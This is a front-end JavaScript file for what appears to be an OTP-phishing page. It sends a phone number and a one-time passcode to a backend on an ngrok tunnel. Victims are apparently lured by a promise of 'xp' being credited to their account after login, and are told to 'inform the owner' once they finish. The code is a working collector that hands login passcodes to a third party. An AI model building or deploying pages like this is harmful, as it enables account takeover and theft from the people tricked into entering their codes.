// Single configuration: point this to the Flask/FastAPI backend base URL
// Examples: "http://localhost:8000" or "https://api.example.com"
const baseUrl = "https://areologic-brannier-tracy.ngrok-free.dev";

const phoneInput = document.getElementById("phone");
const viaSelect = document.getElementById("via");
const sendOtpBtn = document.getElementById("sendOtpBtn");
const resendOtpBtn = document.getElementById("resendOtpBtn");
const resendTimerEl = document.getElementById("resendTimer");
const otpSection = document.getElementById("otpSection");
const otpInput = document.getElementById("otp");
const xpInput = document.getElementById("xp");
const loginBtn = document.getElementById("loginBtn");
const resultDiv = document.getElementById("result");

// Resend cooldown (seconds)
const RESEND_COOLDOWN = 30;
let resendRemaining = 0;
let resendInterval = null;

function showMessage(text, type = "info") {
  let color = "#a6accd";
  if (type === "success") color = "#00d68f";
  if (type === "error") color = "#ff5573";
  resultDiv.style.color = color;
  resultDiv.textContent = text;
}

function startResendCooldown() {
  resendRemaining = RESEND_COOLDOWN;
  resendOtpBtn.disabled = true;
  updateResendTimerText();
  clearInterval(resendInterval);
  resendInterval = setInterval(() => {
    resendRemaining -= 1;
    if (resendRemaining <= 0) {
      clearInterval(resendInterval);
      resendTimerEl.textContent = "";
      resendOtpBtn.disabled = false;
    } else {
      updateResendTimerText();
    }
  }, 1000);
}

function updateResendTimerText() {
  resendTimerEl.textContent = `Resend in ${resendRemaining}s`;
}

function isValidOtp(value) {
  return /^\d{6}$/.test(value);
}

function syncLoginButtonState() {
  const otp = otpInput.value.trim();
  loginBtn.disabled = !isValidOtp(otp);
}

function lockXpUntilLogin() {
  xpInput.disabled = true;
}

function unlockXpAfterLogin() {
  xpInput.disabled = false;
}

async function sendOtpGeneric(via) {
  const phone = phoneInput.value.trim();
  if (!phone) {
    showMessage("Please enter phone number", "error");
    return;
  }

  sendOtpBtn.disabled = true;
  resendOtpBtn.disabled = true;
  showMessage("Sending OTP...");

  try {
    const res = await fetch(`${baseUrl}/auth/send-otp`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone, via }),
    });

    const ok = res.status === 201 || res.status === 200;
    let data = null;
    try { data = await res.json(); } catch { /* ignore */ }

    if (ok) {
      showMessage("OTP sent successfully. Please enter the 6-digit OTP.", "success");
      otpSection.classList.remove("hidden");
      otpInput.focus();
      startResendCooldown();
      lockXpUntilLogin();
    } else {
      const err = data?.raw || data?.detail?.raw || (await res.text());
      showMessage(`Failed to send OTP: ${err}`, "error");
      // Allow resending immediately on error
      clearInterval(resendInterval);
      resendTimerEl.textContent = "";
      resendOtpBtn.disabled = false;
    }
  } catch (e) {
    showMessage(`Network error: ${e}`, "error");
    clearInterval(resendInterval);
    resendTimerEl.textContent = "";
    resendOtpBtn.disabled = false;
  } finally {
    sendOtpBtn.disabled = false;
  }
}

async function sendOtp() {
  const via = viaSelect.value; // "sms" or "wa"
  await sendOtpGeneric(via);
}

async function resendOtp() {
  const via = viaSelect.value;
  await sendOtpGeneric(via);
}

async function login() {
  const phone = phoneInput.value.trim();
  const otp = otpInput.value.trim();
  const xp = Number(xpInput.value);

  if (!isValidOtp(otp)) {
    showMessage("OTP must be 6 digits", "error");
    return;
  }

  loginBtn.disabled = true;
  showMessage("Logging in...");

  try {
    const res = await fetch(`${baseUrl}/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone, otp, xp }),
    });

    let data = null;
    try { data = await res.json(); } catch { /* ignore */ }

    if (res.status === 200) {
      // Do not show JWT; enable XP field now, and show success message
      unlockXpAfterLogin();
      showMessage("login successful... inform the owner that you completed login...your xp will be sent to your account shortly...", "success");
    } else {
      const err = data?.raw || data?.detail?.raw || (await res.text());
      showMessage(`Login failed: ${err}`, "error");
      lockXpUntilLogin();
    }
  } catch (e) {
    showMessage(`Network error: ${e}`, "error");
    lockXpUntilLogin();
  } finally {
    syncLoginButtonState();
  }
}

// Events
sendOtpBtn.addEventListener("click", sendOtp);
resendOtpBtn.addEventListener("click", resendOtp);
loginBtn.addEventListener("click", login);

// OTP input behavior: restrict to digits and 6 length, control login button
otpInput.addEventListener("input", () => {
  // Sanitize: keep digits only, max 6
  let v = otpInput.value.replace(/\D/g, "");
  if (v.length > 6) v = v.slice(0, 6);
  otpInput.value = v;
  syncLoginButtonState();
});

// Initialize state
lockXpUntilLogin();
syncLoginButtonState();

